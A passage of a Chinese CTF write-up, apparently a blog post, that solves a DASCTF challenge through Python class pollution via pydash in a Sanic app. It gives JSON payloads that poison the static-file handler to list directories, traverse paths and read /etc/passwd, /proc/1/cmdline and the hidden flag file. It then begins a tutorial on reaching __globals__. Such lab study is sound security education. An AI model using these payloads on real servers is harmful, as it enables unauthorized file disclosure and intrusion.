class=\"string\">&quot;/access.log&quot;</span></span><br><span class=\"line\">        log_file_bak = <span class=\"string\">&quot;/tmp/&quot;</span> + log_dir_bak + <span class=\"string\">&quot;/access.log.bak&quot;</span></span><br><span class=\"line\">        log = <span class=\"string\">&#x27;key: &#x27;</span> + <span class=\"built_in\">str</span>(key) + <span class=\"string\">&#x27;|&#x27;</span> + <span class=\"string\">&#x27;value: &#x27;</span> + <span class=\"built_in\">str</span>(value);</span><br><span class=\"line\">        <span class=\"comment\"># 生成日志文件</span></span><br><span class=\"line\">        os.system(<span class=\"string\">&quot;mkdir /tmp/&quot;</span> + log_dir)</span><br><span class=\"line\">        <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(log_file, <span class=\"string\">&#x27;w&#x27;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">            f.write(log)</span><br><span class=\"line\">        <span class=\"comment\"># 备份日志文件</span></span><br><span class=\"line\">        os.system(<span class=\"string\">&quot;mkdir /tmp/&quot;</span> + log_dir_bak)</span><br><span class=\"line\">        <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(log_file_bak, <span class=\"string\">&#x27;w&#x27;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">            f.write(log)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> text(<span class=\"string\">&quot;！！！此地禁止胡来，你的非法操作已经被记录！！！&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    app.run(host=<span class=\"string\">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure>\n<p>​\t\t一眼不丁真。这个感觉和之前打的题都不一样，因为之前的思路都是污染 <code>__file__</code> 属性，但是这一次似乎不是，并且，pollute 路由还过滤了 parts 和 proc 以及限制 value 不能是列表。</p>\n<p>​\t\t这个题我不是很能理解，感觉很逆天，考点主要的是 sanic 框架的漏洞题，先贴一下原理吧，虽然我也不是很明白。</p>\n<p>​\t\t首先是根基 static 函数，之后，之后跟进 <code>DirectoryHandler</code>  类，找到了如下两段：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">      current = path.strip(<span class=\"string\">&quot;/&quot;</span>)[<span class=\"built_in\">len</span>(self.base) :].strip(<span class=\"string\">&quot;/&quot;</span>)  <span class=\"comment\"># noqa: E203</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> self.directory_view:</span><br><span class=\"line\">          <span class=\"keyword\">return</span> self._index(</span><br><span class=\"line\">              self.directory / current, path, request.app.debug</span><br><span class=\"line\">          )</span><br></pre></td></tr></table></figure>\n<p>​\t\t当开启了目录功能后，就会进入</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">return</span> self._index(</span><br><span class=\"line\">             self.directory / current, path, request.app.debug</span><br><span class=\"line\">         )</span><br></pre></td></tr></table></figure>\n<p>​\t\t这一点很重要，跟进 <code>_index</code>  看看：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">_index</span>(<span class=\"params\">self, location: Path, path: <span class=\"built_in\">str</span>, debug: <span class=\"built_in\">bool</span></span>):</span><br><span class=\"line\">    <span class=\"comment\"># Remove empty path elements, append slash</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"string\">&quot;//&quot;</span> <span class=\"keyword\">in</span> path <span class=\"keyword\">or</span> <span class=\"keyword\">not</span> path.endswith(<span class=\"string\">&quot;/&quot;</span>):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> redirect(</span><br><span class=\"line\">            <span class=\"string\">&quot;/&quot;</span> + <span class=\"string\">&quot;&quot;</span>.join([<span class=\"string\">f&quot;<span class=\"subst\">&#123;p&#125;</span>/&quot;</span> <span class=\"keyword\">for</span> p <span class=\"keyword\">in</span> path.split(<span class=\"string\">&quot;/&quot;</span>) <span class=\"keyword\">if</span> p])</span><br><span class=\"line\">        )</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># Render file browser</span></span><br><span class=\"line\">    page = DirectoryPage(self._iter_files(location), path, debug)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> html(page.render())</span><br></pre></td></tr></table></figure>\n<p>​\t\t很显然， <code>_index</code>  是一个拼接函数，主要是为了拼接目录的。根据下面这一行，我们又有了可以操作的空间了：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">current = path.strip(<span class=\"string\">&quot;/&quot;</span>)[<span class=\"built_in\">len</span>(self.base) :].strip(<span class=\"string\">&quot;/&quot;</span>)  <span class=\"comment\"># noqa: E203</span></span><br></pre></td></tr></table></figure>\n<p>​\t\t发现了啥？这里 path 在被分割的时候有个情况，就是将路径从 base 字符串结尾开始的所有字符串去掉头尾的 <code>'/'</code>  字符后返回，也就是说，当我们把 base 属性污染成指定的字符串之后，后面如果出现了两个点，也就是 <code>..</code>  就说明了 current 返回的字符串可能存在路径穿越。</p>\n<p>​\t\t好了， 再回来看看这个题，首先，最好应该先获取完整的源代码，所以这里可以像之前的题一样污染 <code>directory_view</code>  属性打开静态文件目录。payload 如下：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"punctuation\">&#123;</span></span><br><span class=\"line\"><span class=\"attr\">&quot;key&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;__class__\\\\\\\\.__init__\\\\\\\\.__globals__\\\\\\\\.app.router.name_index.__mp_main__\\\\.static.handler.keywords.directory_handler.directory_view&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\"><span class=\"attr\">&quot;value&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"punctuation\">&#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\">#这个payload不知道为啥访问static目录的时候感觉没啥变化，但是如果加上了像什么/static/etc/passwd之类的文件却能访问到</span><br><span class=\"line\"><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;key&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;__class__\\\\\\\\.__init__\\\\\\\\.__globals__\\\\\\\\.app.router.name_index.__mp_main__\\\\.static.handler.keywords.file_or_directory&quot;</span><span class=\"punctuation\">,</span><span class=\"attr\">&quot;value&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;/&quot;</span><span class=\"punctuation\">&#125;</span></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://i-blog.csdnimg.cn/direct/d67ac7ea195d460b8d80bdeb0f7d00a9.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>​\t\t既然能成，那正常访问 <code>/static/proc/1/cmdline</code> ，发现了重要的东西，就是</p>\n<figure class=\"highlight tex\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/bin/bash  /start.sh</span><br></pre></td></tr></table></figure>\n<p>​\t\t访问 <code> /static/start.sh</code>  之后获得信息：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">!/bin/bash</span></span><br><span class=\"line\"></span><br><span class=\"line\">if [[ -f /flag.sh ]]; then</span><br><span class=\"line\">\tsource /flag.sh</span><br><span class=\"line\">\trm -f /flag.sh</span><br><span class=\"line\">fi</span><br><span class=\"line\"></span><br><span class=\"line\">python3 /app/2Q17A58T9F65y5i8.py</span><br></pre></td></tr></table></figure>\n<p>​\t\t找到了文件名了，读取 <code>/static/app/2Q17A58T9F65y5i8.py</code>  看看：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> sanic <span class=\"keyword\">import</span> Sanic</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">from</span> sanic.response <span class=\"keyword\">import</span> text, html</span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"><span class=\"keyword\">import</span> random</span><br><span class=\"line\"><span class=\"keyword\">import</span> pydash</span><br><span class=\"line\"><span class=\"comment\"># pydash==5.1.2</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#源码好像被admin删掉了一些，听他说里面藏有大秘密</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Pollute</span>:</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"keyword\">pass</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">create_log_dir</span>(<span class=\"params\">n</span>):</span><br><span class=\"line\">        ret = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(n):</span><br><span class=\"line\">            num = random.randint(<span class=\"number\">0</span>, <span class=\"number\">9</span>)</span><br><span class=\"line\">            letter = <span class=\"built_in\">chr</span>(random.randint(<span class=\"number\">97</span>, <span class=\"number\">122</span>))</span><br><span class=\"line\">            Letter = <span class=\"built_in\">chr</span>(random.randint(<span class=\"number\">65</span>, <span class=\"number\">90</span>))</span><br><span class=\"line\">            s = <span class=\"built_in\">str</span>(random.choice([num, letter, Letter]))</span><br><span class=\"line\">            ret += s</span><br><span class=\"line\">        <span class=\"keyword\">return</span> ret</span><br><span class=\"line\">        </span><br><span class=\"line\">app = Sanic(__name__)</span><br><span class=\"line\">app.static(<span class=\"string\">&quot;/static/&quot;</span>, <span class=\"string\">&quot;./static/&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&quot;/Wa58a1qEQ59857qQRPPQ&quot;</span></span>)</span></span><br><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"keyword\">def</span> <span class=\"title function_\">secret</span>(<span class=\"params\">request</span>):</span><br><span class=\"line\">    <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&quot;/h111int&quot;</span>,<span class=\"string\">&#x27;r&#x27;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">       hint=f.read()</span><br><span class=\"line\">    <span class=\"keyword\">return</span> text(hint)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/&#x27;</span>, methods=[<span class=\"string\">&#x27;GET&#x27;</span>, <span class=\"string\">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"keyword\">def</span> <span class=\"title function_\">index</span>(<span class=\"params\">request</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> html(<span class=\"built_in\">open</span>(<span class=\"string\">&#x27;static/index.html&#x27;</span>).read())</span><br><span class=\"line\">   </span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&quot;/adminLook&quot;</span>, methods=[<span class=\"string\">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"keyword\">def</span> <span class=\"title function_\">AdminLook</span>(<span class=\"params\">request</span>):</span><br><span class=\"line\">    <span class=\"comment\">#方便管理员查看非法日志</span></span><br><span class=\"line\">    log_dir=os.popen(<span class=\"string\">&#x27;ls /tmp -al&#x27;</span>).read();</span><br><span class=\"line\">    <span class=\"keyword\">return</span> text(log_dir)</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&quot;/pollute&quot;</span>, methods=[<span class=\"string\">&#x27;GET&#x27;</span>, <span class=\"string\">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"keyword\">def</span> <span class=\"title function_\">POLLUTE</span>(<span class=\"params\">request</span>):</span><br><span class=\"line\">    key = request.json[<span class=\"string\">&#x27;key&#x27;</span>]</span><br><span class=\"line\">    value = request.json[<span class=\"string\">&#x27;value&#x27;</span>]</span><br><span class=\"line\">    <span class=\"keyword\">if</span> key <span class=\"keyword\">and</span> value <span class=\"keyword\">and</span> <span class=\"built_in\">type</span>(key) <span class=\"keyword\">is</span> <span class=\"built_in\">str</span> <span class=\"keyword\">and</span> <span class=\"string\">&#x27;parts&#x27;</span> <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> key <span class=\"keyword\">and</span> <span class=\"string\">&#x27;proc&#x27;</span> <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> <span class=\"built_in\">str</span>(value) <span class=\"keyword\">and</span> <span class=\"built_in\">type</span>(value) <span class=\"keyword\">is</span> <span class=\"keyword\">not</span> <span class=\"built_in\">list</span>:</span><br><span class=\"line\">        pollute = Pollute()</span><br><span class=\"line\">        pydash.set_(pollute, key, value)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> text(<span class=\"string\">&quot;success&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        log_dir=create_log_dir(<span class=\"number\">6</span>)</span><br><span class=\"line\">        log_dir_bak=log_dir+<span class=\"string\">&quot;..&quot;</span></span><br><span class=\"line\">        log_file=<span class=\"string\">&quot;/tmp/&quot;</span>+log_dir+<span class=\"string\">&quot;/access.log&quot;</span></span><br><span class=\"line\">        log_file_bak=<span class=\"string\">&quot;/tmp/&quot;</span>+log_dir_bak+<span class=\"string\">&quot;/access.log.bak&quot;</span></span><br><span class=\"line\">        log=<span class=\"string\">&#x27;key: &#x27;</span>+<span class=\"built_in\">str</span>(key)+<span class=\"string\">&#x27;|&#x27;</span>+<span class=\"string\">&#x27;value: &#x27;</span>+<span class=\"built_in\">str</span>(value);</span><br><span class=\"line\">        <span class=\"comment\">#生成日志文件</span></span><br><span class=\"line\">        os.system(<span class=\"string\">&quot;mkdir /tmp/&quot;</span>+log_dir)</span><br><span class=\"line\">        <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(log_file, <span class=\"string\">&#x27;w&#x27;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">             f.write(log)</span><br><span class=\"line\">        <span class=\"comment\">#备份日志文件</span></span><br><span class=\"line\">        os.system(<span class=\"string\">&quot;mkdir /tmp/&quot;</span>+log_dir_bak)</span><br><span class=\"line\">        <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(log_file_bak, <span class=\"string\">&#x27;w&#x27;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">             f.write(log)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> text(<span class=\"string\">&quot;！！！此地禁止胡来，你的非法操作已经被记录！！！&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    app.run(host=<span class=\"string\">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure>\n<p>​\t\t这儿发现了个可以利用的点，似乎有个可以利用的产生目录穿越的点了，因为生成的 log_dir 变量后面增加了个 <code>..</code>  作为备份：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    log_dir=create_log_dir(<span class=\"number\">6</span>)</span><br><span class=\"line\">    log_dir_bak=log_dir+<span class=\"string\">&quot;..&quot;</span></span><br><span class=\"line\">    log_file=<span class=\"string\">&quot;/tmp/&quot;</span>+log_dir+<span class=\"string\">&quot;/access.log&quot;</span></span><br><span class=\"line\">    log_file_bak=<span class=\"string\">&quot;/tmp/&quot;</span>+log_dir_bak+<span class=\"string\">&quot;/access.log.bak&quot;</span></span><br><span class=\"line\">    log=<span class=\"string\">&#x27;key: &#x27;</span>+<span class=\"built_in\">str</span>(key)+<span class=\"string\">&#x27;|&#x27;</span>+<span class=\"string\">&#x27;value: &#x27;</span>+<span class=\"built_in\">str</span>(value);</span><br><span class=\"line\">    <span class=\"comment\">#生成日志文件</span></span><br><span class=\"line\">    os.system(<span class=\"string\">&quot;mkdir /tmp/&quot;</span>+log_dir)</span><br><span class=\"line\">    <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(log_file, <span class=\"string\">&#x27;w&#x27;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">         f.write(log)</span><br><span class=\"line\">    <span class=\"comment\">#备份日志文件</span></span><br><span class=\"line\">    os.system(<span class=\"string\">&quot;mkdir /tmp/&quot;</span>+log_dir_bak)</span><br><span class=\"line\">    <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(log_file_bak, <span class=\"string\">&#x27;w&#x27;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">         f.write(log)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> text(<span class=\"string\">&quot;！！！此地禁止胡来，你的非法操作已经被记录！！！&quot;</span>)</span><br></pre></td></tr></table></figure>\n<p>​\t\t不过先访问下机密路由 <code>Wa58a1qEQ59857qQRPPQ</code> ：</p>\n<figure class=\"highlight tex\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag in /app,but you need to find his name！！！</span><br><span class=\"line\">Find a way to see the file names in the app directory</span><br></pre></td></tr></table></figure>\n<p>​\t\t提示很明显了，flag 在 /app 文件夹内。</p>\n<p>​\t\t这里似乎有个没用到的看起来很重要的点，先提前随便进行一次个不能成功的污染，比如 key 中存在 parts 字符串。之后访问下这个 <code>adminLook</code>  路由试试:</p>\n<figure class=\"highlight tex\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">total 0</span><br><span class=\"line\">drwxrwxrwt 1 root root 57 Jul 21 23:04 .</span><br><span class=\"line\">drwxr-xr-x 1 root root 43 Jul 21 22:49 ..</span><br><span class=\"line\">drwxr-xr-x 2 root root 24 Jul 21 23:04 73ycOr</span><br><span class=\"line\">drwxr-xr-x 2 root root 28 Jul 21 23:04 73ycOr..</span><br><span class=\"line\">drwx------ 2 root root 31 Jul 21 22:49 pymp-zra4pxem</span><br></pre></td></tr></table></figure>\n<p>​\t\t可以看到，成功产生了一个结尾两个点的目录，之后就是污染 base 属性进行目录穿越了，payload 如下：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#先切换到/tep目录下</span><br><span class=\"line\"><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;key&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;__class__\\\\\\\\.__init__\\\\\\\\.__globals__\\\\\\\\.app.router.name_index.__mp_main__\\\\.static.handler.keywords.file_or_directory&quot;</span><span class=\"punctuation\">,</span><span class=\"attr\">&quot;value&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;/tmp&quot;</span><span class=\"punctuation\">&#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\">#对base属性进行污染</span><br><span class=\"line\"><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;key&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;__class__\\\\\\\\.__init__\\\\\\\\.__globals__\\\\\\\\.app.router.name_index.__mp_main__\\\\.static.handler.keywords.directory_handler.base&quot;</span><span class=\"punctuation\">,</span><span class=\"attr\">&quot;value&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;static/73ycOr&quot;</span><span class=\"punctuation\">&#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\">#打开目录功能</span><br><span class=\"line\"><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;key&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;__class__\\\\\\\\.__init__\\\\\\\\.__globals__\\\\\\\\.app.router.name_index.__mp_main__\\\\.static.handler.keywords.directory_handler.directory_view&quot;</span><span class=\"punctuation\">,</span><span class=\"attr\">&quot;value&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">1</span><span class=\"punctuation\">&#125;</span></span><br></pre></td></tr></table></figure>\n<p>​\t\t然后访问 <code>/static/73ycOr../</code>  找到了 flag 文件的文件名： <code>45W698WqtsgQT1_flag</code> 。</p>\n<p>​\t\t之后污染静态文件目录为根目录，然后访问 <code>/static/app/45W698WqtsgQT1_flag</code>  即可：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;key&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;__class__\\\\\\\\.__init__\\\\\\\\.__globals__\\\\\\\\.app.router.name_index.__mp_main__\\\\.static.handler.keywords.file_or_directory&quot;</span><span class=\"punctuation\">,</span><span class=\"attr\">&quot;value&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;/&quot;</span><span class=\"punctuation\">&#125;</span></span><br></pre></td></tr></table></figure>\n<p>​\t\tflag: <code>DASCTF&#123;8543c470-d4aa-4668-b051-43ed5c9517b1&#125;</code></p>\n<h1 id=\"python原型链污染变体跟随article_kelp学\"><a class=\"markdownIt-Anchor\" href=\"#python原型链污染变体跟随article_kelp学\">#</a> Python 原型链污染变体 (跟随 Article_kelp 学)</h1>\n<p>​\t\t前面的基础已经说过了，这里就跳过了，具体可以看看之前的 merge 函数方面的内容。</p>\n<h2 id=\"1-更广泛的获取\"><a class=\"markdownIt-Anchor\" href=\"#1-更广泛的获取\">#</a> 1、更广泛的获取：</h2>\n<p>​\t\t污染类属性是可以通过示例的 <code>__base__</code> 属性查找到其继承的父类，但是如果目标类与切入点类或实例没有继承关系时，这种方法就显得十分无力，代码在上面也早已给出来了。</p>\n<h2 id=\"2-全局变量的获取\"><a class=\"markdownIt-Anchor\" href=\"#2-全局变量的获取\">#</a> 2、全局变量的获取：</h2>\n<p>​\t\t在 <code>Python</code>  中，函数或类方法（对于类的内置方法如 <code>__init__</code> 这些来说，内置方法在并未重写时其数据类型为装饰器即 <code>wrapper_descriptor</code> ，只有在重写后才是函数 <code>function</code> ）均具有一个 <code>__globals__</code> 属性，该属性将函数或类方法所申明的变量空间中的全局变量以字典的形式返回（相当于这个变量空间中的 <code>globals</code>  函数的返回值</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">secret_var = <span class=\"number\">114</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">test</span>():</span><br><span class=\"line\">    <span class=\"keyword\">pass</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">a</span>:</span><br><span class=\"line\">    secret_class_var = <span class=\"string\">&quot;secret&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">b</span>:</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"keyword\">pass</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">merge</span>(<span class=\"params\">src, dst</span>):</span><br><span class=\"line\">    <span class=\"comment\"># Recursive merge function</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> k, v <span class=\"keyword\">in</span> src.items():</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">hasattr</span>(dst, <span class=\"string\">&#x27;__getitem__&#x27;</span>):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> dst.get(k) <span class=\"keyword\">and</span> <span class=\"built_in\">type</span>(v) == <span class=\"built_in\">dict</span>:</span><br><span class=\"line\">                merge(v, dst.get(k))</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                dst[k] = v</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">hasattr</span>(dst, k) <span class=\"keyword\">and</span> <span class=\"built_in\">type</span>(v) == <span class=\"built_in\">dict</span>:</span><br><span 